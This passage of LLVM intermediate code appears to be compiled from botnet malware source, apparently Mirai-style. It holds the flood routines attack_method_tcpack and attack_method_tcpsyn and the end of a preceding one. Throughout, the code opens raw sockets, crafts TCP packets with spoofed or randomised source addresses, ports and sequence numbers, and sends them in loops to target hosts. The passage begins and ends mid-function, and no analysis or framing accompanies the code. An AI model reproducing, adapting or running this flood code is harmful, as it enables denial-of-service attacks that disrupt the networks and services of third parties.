  %78 = bitcast i8* %77 to i32*
  store i32 %26, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %60, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #8
  %84 = bitcast i8* %62 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #8
  %86 = getelementptr inbounds i8, i8* %60, i64 22
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %39) #8
  %89 = getelementptr inbounds i8, i8* %60, i64 24
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %91 = icmp slt i64 %indvars.iv.next, %41
  br i1 %91, label %59, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %146
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %45, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %146
  %storemerge8284 = phi i32 [ %167, %146 ], [ 0, %.lr.ph.preheader ]
  %92 = sext i32 %storemerge8284 to i64
  %93 = getelementptr inbounds i8*, i8** %8, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  %96 = getelementptr inbounds i8, i8* %94, i64 20
  %97 = call i32 @rand() #7
  %98 = srem i32 %97, 4096
  %99 = add nsw i32 %98, 1
  %100 = sext i32 %99 to i64
  %101 = inttoptr i64 %100 to i8*
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %103, i32 2
  %105 = load i8, i8* %104, align 4
  %106 = icmp ult i8 %105, 32
  br i1 %106, label %107, label %122

; <label>:107:                                    ; preds = %.lr.ph
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %103, i32 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @ntohl(i32 %109) #8
  %111 = call i32 @rand_next() #7
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 2
  %115 = load i8, i8* %114, align 4
  %116 = zext i8 %115 to i32
  %117 = lshr i32 %111, %116
  %118 = add i32 %117, %110
  %119 = call i32 @htonl(i32 %118) #8
  %120 = getelementptr inbounds i8, i8* %94, i64 16
  %121 = bitcast i8* %120 to i32*
  store i32 %119, i32* %121, align 4
  br label %122

; <label>:122:                                    ; preds = %107, %.lr.ph
  br i1 %46, label %123, label %127

; <label>:123:                                    ; preds = %122
  %124 = call i32 @rand_next() #7
  %125 = getelementptr inbounds i8, i8* %94, i64 12
  %126 = bitcast i8* %125 to i32*
  store i32 %124, i32* %126, align 4
  br label %127

; <label>:127:                                    ; preds = %123, %122
  br i1 %48, label %128, label %133

; <label>:128:                                    ; preds = %127
  %129 = call i32 @rand_next() #7
  %130 = trunc i32 %129 to i16
  %131 = getelementptr inbounds i8, i8* %94, i64 4
  %132 = bitcast i8* %131 to i16*
  store i16 %130, i16* %132, align 4
  br label %133

; <label>:133:                                    ; preds = %128, %127
  br i1 %50, label %134, label %138

; <label>:134:                                    ; preds = %133
  %135 = call i32 @rand_next() #7
  %136 = trunc i32 %135 to i16
  %137 = bitcast i8* %96 to i16*
  store i16 %136, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %134, %133
  br i1 %52, label %139, label %144

; <label>:139:                                    ; preds = %138
  %140 = call i32 @rand_next() #7
  %141 = trunc i32 %140 to i16
  %142 = getelementptr inbounds i8, i8* %94, i64 22
  %143 = bitcast i8* %142 to i16*
  store i16 %141, i16* %143, align 2
  br label %144

; <label>:144:                                    ; preds = %139, %138
  br i1 %53, label %146, label %145

; <label>:145:                                    ; preds = %144
  call void @rand_str(i8* %101, i32 %58) #7
  br label %146

; <label>:146:                                    ; preds = %144, %145
  %147 = getelementptr inbounds i8, i8* %94, i64 10
  %148 = bitcast i8* %147 to i16*
  store i16 0, i16* %148, align 2
  %149 = bitcast i8* %94 to i16*
  %150 = call zeroext i16 @checksum_generic(i16* %149, i32 20) #7
  store i16 %150, i16* %148, align 2
  %151 = getelementptr inbounds i8, i8* %94, i64 26
  %152 = bitcast i8* %151 to i16*
  store i16 0, i16* %152, align 2
  %153 = getelementptr inbounds i8, i8* %94, i64 24
  %154 = bitcast i8* %153 to i16*
  %155 = load i16, i16* %154, align 2
  %156 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %95, i8* %96, i16 zeroext %155, i32 %56) #7
  store i16 %156, i16* %152, align 2
  %157 = getelementptr inbounds i8, i8* %94, i64 22
  %158 = bitcast i8* %157 to i16*
  %159 = load i16, i16* %158, align 2
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %161, i32 0, i32 1
  store i16 %159, i16* %162, align 2
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %161, i32 0
  %164 = bitcast %struct.sockaddr_in* %163 to %struct.sockaddr*
  %165 = call i64 @sendto(i32 %29, i8* %94, i64 %57, i32 16384, %struct.sockaddr* %164, i32 16) #7
  %166 = load i32, i32* %5, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %5, align 4
  %168 = icmp slt i32 %167, %35
  br i1 %168, label %.lr.ph, label %.loopexit.loopexit

; <label>:169:                                    ; preds = %4, %42
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %223, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #7
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  br label %88

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #7
  br label %223

.preheader.loopexit:                              ; preds = %140
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i8 %0, 0
  %73 = icmp eq i32 %39, -1
  %74 = and i32 %11, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = and i32 %17, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = and i32 %19, 65535
  %79 = icmp eq i32 %78, 65535
  %80 = icmp eq i32 %21, 65535
  %81 = icmp eq i32 %22, 65535
  %82 = icmp eq i8 %37, 0
  %83 = sext i32 %35 to i64
  %84 = add nsw i64 %83, 20
  %85 = trunc i64 %84 to i16
  %86 = trunc i64 %84 to i32
  %87 = add nsw i64 %83, 40
  br label %.loopexit

; <label>:88:                                     ; preds = %.lr.ph129, %140
  %89 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %8, i64 %91
  store i8* %89, i8** %92, align 8
  %93 = getelementptr inbounds i8, i8* %89, i64 20
  %94 = getelementptr inbounds i8, i8* %89, i64 10260
  store i8 69, i8* %89, align 4
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %95, align 1
  %96 = call zeroext i16 @htons(i16 zeroext %49) #8
  %97 = getelementptr inbounds i8, i8* %89, i64 2
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %12) #8
  %100 = getelementptr inbounds i8, i8* %89, i64 4
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 4
  %102 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %102, align 4
  br i1 %50, label %107, label %103

; <label>:103:                                    ; preds = %88
  %104 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %105 = getelementptr inbounds i8, i8* %89, i64 6
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %88, %103
  %108 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %108, align 1
  %109 = getelementptr inbounds i8, i8* %89, i64 12
  %110 = bitcast i8* %109 to i32*
  store i32 %39, i32* %110, align 4
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %112, i32 1
  %114 = load i32, i32* %113, align 4
  %115 = getelementptr inbounds i8, i8* %89, i64 16
  %116 = bitcast i8* %115 to i32*
  store i32 %114, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %18) #8
  %118 = bitcast i8* %93 to i16*
  store i16 %117, i16* %118, align 4
  %119 = call zeroext i16 @htons(i16 zeroext %20) #8
  %120 = getelementptr inbounds i8, i8* %89, i64 22
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %51) #8
  %123 = zext i16 %122 to i32
  %124 = getelementptr inbounds i8, i8* %89, i64 24
  %125 = bitcast i8* %124 to i32*
  store i32 %123, i32* %125, align 4
  %126 = getelementptr inbounds i8, i8* %89, i64 32
  %127 = bitcast i8* %126 to i16*
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -16369
  %130 = or i16 %68, %129
  %131 = or i16 %130, 80
  store i16 %131, i16* %127, align 4
  %132 = call i32 @rand() #7
  %133 = srem i32 %132, 65535
  %134 = trunc i32 %133 to i16
  %135 = getelementptr inbounds i8, i8* %89, i64 34
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  br i1 %69, label %140, label %137

; <label>:137:                                    ; preds = %107
  %138 = load i16, i16* %127, align 4
  %139 = or i16 %138, 2048
  store i16 %139, i16* %127, align 4
  br label %140

; <label>:140:                                    ; preds = %107, %137
  call void @rand_str(i8* nonnull %94, i32 %35) #7
  %141 = load i32, i32* %5, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %5, align 4
  %143 = icmp slt i32 %142, %46
  br i1 %143, label %88, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %202
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %72, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %202
  %storemerge121128 = phi i32 [ %221, %202 ], [ 0, %.lr.ph.preheader ]
  %144 = sext i32 %storemerge121128 to i64
  %145 = getelementptr inbounds i8*, i8** %8, i64 %144
  %146 = load i8*, i8** %145, align 8
  %147 = bitcast i8* %146 to %struct.iphdr*
  %148 = getelementptr inbounds i8, i8* %146, i64 20
  %149 = getelementptr inbounds i8, i8* %146, i64 40
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %144, i32 2
  %151 = load i8, i8* %150, align 4
  %152 = icmp ult i8 %151, 32
  br i1 %152, label %153, label %168

; <label>:153:                                    ; preds = %.lr.ph
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %144, i32 1
  %155 = load i32, i32* %154, align 4
  %156 = call i32 @ntohl(i32 %155) #8
  %157 = call i32 @rand_next() #7
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 2
  %161 = load i8, i8* %160, align 4
  %162 = zext i8 %161 to i32
  %163 = lshr i32 %157, %162
  %164 = add i32 %163, %156
  %165 = call i32 @htonl(i32 %164) #8
  %166 = getelementptr inbounds i8, i8* %146, i64 16
  %167 = bitcast i8* %166 to i32*
  store i32 %165, i32* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %153, %.lr.ph
  br i1 %73, label %169, label %173

; <label>:169:                                    ; preds = %168
  %170 = call i32 @rand_next() #7
  %171 = getelementptr inbounds i8, i8* %146, i64 12
  %172 = bitcast i8* %171 to i32*
  store i32 %170, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %169, %168
  br i1 %75, label %174, label %179

; <label>:174:                                    ; preds = %173
  %175 = call i32 @rand_next() #7
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds i8, i8* %146, i64 4
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 4
  br label %179

; <label>:179:                                    ; preds = %174, %173
  br i1 %77, label %180, label %184

; <label>:180:                                    ; preds = %179
  %181 = call i32 @rand_next() #7
  %182 = trunc i32 %181 to i16
  %183 = bitcast i8* %148 to i16*
  store i16 %182, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %180, %179
  br i1 %79, label %185, label %190

; <label>:185:                                    ; preds = %184
  %186 = call i32 @rand_next() #7
  %187 = trunc i32 %186 to i16
  %188 = getelementptr inbounds i8, i8* %146, i64 22
  %189 = bitcast i8* %188 to i16*
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %185, %184
  br i1 %80, label %191, label %195

; <label>:191:                                    ; preds = %190
  %192 = call i32 @rand_next() #7
  %193 = getelementptr inbounds i8, i8* %146, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 %192, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %191, %190
  br i1 %81, label %196, label %200

; <label>:196:                                    ; preds = %195
  %197 = call i32 @rand_next() #7
  %198 = getelementptr inbounds i8, i8* %146, i64 28
  %199 = bitcast i8* %198 to i32*
  store i32 %197, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %196, %195
  br i1 %82, label %202, label %201

; <label>:201:                                    ; preds = %200
  call void @rand_str(i8* %149, i32 %35) #7
  br label %202

; <label>:202:                                    ; preds = %200, %201
  %203 = getelementptr inbounds i8, i8* %146, i64 10
  %204 = bitcast i8* %203 to i16*
  store i16 0, i16* %204, align 2
  %205 = bitcast i8* %146 to i16*
  %206 = call zeroext i16 @checksum_generic(i16* %205, i32 20) #7
  store i16 %206, i16* %204, align 2
  %207 = getelementptr inbounds i8, i8* %146, i64 36
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext %85) #8
  %210 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %147, i8* %148, i16 zeroext %209, i32 %86) #7
  store i16 %210, i16* %208, align 4
  %211 = getelementptr inbounds i8, i8* %146, i64 22
  %212 = bitcast i8* %211 to i16*
  %213 = load i16, i16* %212, align 2
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0, i32 1
  store i16 %213, i16* %216, align 2
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %218 = bitcast %struct.sockaddr_in* %217 to %struct.sockaddr*
  %219 = call i64 @sendto(i32 %40, i8* %146, i64 %87, i32 16384, %struct.sockaddr* %218, i32 16) #7
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  %222 = icmp slt i32 %221, %46
  br i1 %222, label %.lr.ph, label %.loopexit.loopexit

; <label>:223:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %227, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #7
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %64, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  br label %77

; <label>:64:                                     ; preds = %39
  %65 = call i32 @close(i32 %37) #7
  br label %227

.preheader.loopexit:                              ; preds = %96
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader128
  %66 = icmp eq i8 %0, 0
  %67 = icmp eq i32 %36, -1
  %68 = and i32 %11, 65535
  %69 = icmp eq i32 %68, 65535
  %70 = and i32 %17, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %19, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = icmp eq i32 %21, 65535
  %75 = icmp eq i32 %22, 65535
  %76 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:77:                                     ; preds = %.lr.ph130, %96
  %78 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %8, i64 %80
  store i8* %78, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %78, i64 20
  %83 = getelementptr inbounds i8, i8* %78, i64 40
  store i8 69, i8* %78, align 4
  %84 = getelementptr inbounds i8, i8* %78, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #8
  %86 = getelementptr inbounds i8, i8* %78, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #8
  %89 = getelementptr inbounds i8, i8* %78, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %78, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %77
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %94 = getelementptr inbounds i8, i8* %78, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %77, %92
  %97 = getelementptr inbounds i8, i8* %78, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %78, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %101, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = getelementptr inbounds i8, i8* %78, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %18) #8
  %107 = bitcast i8* %82 to i16*
  store i16 %106, i16* %107, align 4
  %108 = call zeroext i16 @htons(i16 zeroext %20) #8
  %109 = getelementptr inbounds i8, i8* %78, i64 22
  %110 = bitcast i8* %109 to i16*
  store i16 %108, i16* %110, align 2
  %111 = call zeroext i16 @htons(i16 zeroext %46) #8
  %112 = zext i16 %111 to i32
  %113 = getelementptr inbounds i8, i8* %78, i64 24
  %114 = bitcast i8* %113 to i32*
  store i32 %112, i32* %114, align 4
  %115 = getelementptr inbounds i8, i8* %78, i64 32
  %116 = bitcast i8* %115 to i16*
  %117 = load i16, i16* %116, align 4
  %118 = and i16 %117, -16369
  %119 = or i16 %63, %118
  %120 = or i16 %119, 160
  store i16 %120, i16* %116, align 4
  %121 = getelementptr inbounds i8, i8* %78, i64 41
  store i8 2, i8* %83, align 1
  %122 = getelementptr inbounds i8, i8* %78, i64 42
  store i8 4, i8* %121, align 1
  %123 = call i32 @rand_next() #7
  %124 = and i32 %123, 15
  %125 = add nuw nsw i32 %124, 1458
  %126 = trunc i32 %125 to i16
  %127 = call zeroext i16 @htons(i16 zeroext %126) #8
  %128 = bitcast i8* %122 to i16*
  store i16 %127, i16* %128, align 2
  %129 = getelementptr inbounds i8, i8* %78, i64 44
  %130 = getelementptr inbounds i8, i8* %78, i64 45
  store i8 4, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %78, i64 46
  store i8 2, i8* %130, align 1
  %132 = getelementptr inbounds i8, i8* %78, i64 47
  store i8 8, i8* %131, align 1
  %133 = getelementptr inbounds i8, i8* %78, i64 48
  store i8 10, i8* %132, align 1
  %134 = call i32 @rand_next() #7
  %135 = bitcast i8* %133 to i32*
  store i32 %134, i32* %135, align 4
  %136 = getelementptr inbounds i8, i8* %78, i64 52
  %137 = bitcast i8* %136 to i32*
  store i32 0, i32* %137, align 4
  %138 = getelementptr inbounds i8, i8* %78, i64 56
  %139 = getelementptr inbounds i8, i8* %78, i64 57
  store i8 1, i8* %138, align 1
  %140 = getelementptr inbounds i8, i8* %78, i64 58
  store i8 3, i8* %139, align 1
  %141 = getelementptr inbounds i8, i8* %78, i64 59
  store i8 3, i8* %140, align 1
  store i8 8, i8* %141, align 1
  %142 = load i32, i32* %5, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %5, align 4
  %144 = icmp slt i32 %143, %43
  br i1 %144, label %77, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %206
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %66, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %206
  %storemerge122129 = phi i32 [ %225, %206 ], [ 0, %.lr.ph.preheader ]
  %145 = sext i32 %storemerge122129 to i64
  %146 = getelementptr inbounds i8*, i8** %8, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %145, i32 2
  %151 = load i8, i8* %150, align 4
  %152 = icmp ult i8 %151, 32
  br i1 %152, label %153, label %168

; <label>:153:                                    ; preds = %.lr.ph
